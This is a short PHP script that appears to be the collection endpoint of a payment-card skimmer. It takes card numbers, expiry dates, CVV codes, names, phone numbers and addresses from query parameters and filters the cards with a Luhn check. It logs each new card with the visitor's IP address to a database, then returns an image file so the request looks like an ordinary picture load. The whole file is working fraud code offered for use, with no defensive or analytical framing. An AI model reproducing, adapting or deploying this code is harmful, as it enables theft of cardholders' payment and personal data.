<?php
error_reporting(0);
function is_valid_luhn($number) {
  $number = preg_replace('~[^0-9]+~','',$_GET['card_num']); //на всякий удалю все кроме цифр
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}


if(isset($_GET['card_num']) && is_valid_luhn($_GET['card_num'])){
    header("Content-type: image/png");
    include_once './include/db/db_connect.php';
    $_GET['card_num'] = preg_replace('~[^0-9]+~','',$_GET['card_num']); //на всякий удалю все кроме цифр
    

    
    if($db->getOne('SELECT card_num FROM logs WHERE card_num=?s', $_GET['card_num']) != $_GET['card_num'])
        
        $db->query('INSERT INTO logs SET ip=?s, card_num=?s, card_expm=?s, card_expy=?s, card_cvv=?s, fname=?s, lname=?s, tel=?s, country=?s, region=?s, street=?s, city=?s, zip=?s', $_SERVER['REMOTE_ADDR'],$_GET['card_num'],$_GET['card_expm'],$_GET['card_expy'],$_GET['card_cvv'],$_GET['fname'],$_GET['lname'],$_GET['tel'],$_GET['country'],$_GET['region'],$_GET['street'],$_GET['city'],$_GET['zip']);
    else
        
        readfile('img.png');
        exit;
}


header("Content-type: image/png");
readfile('img.png');
exit;



?>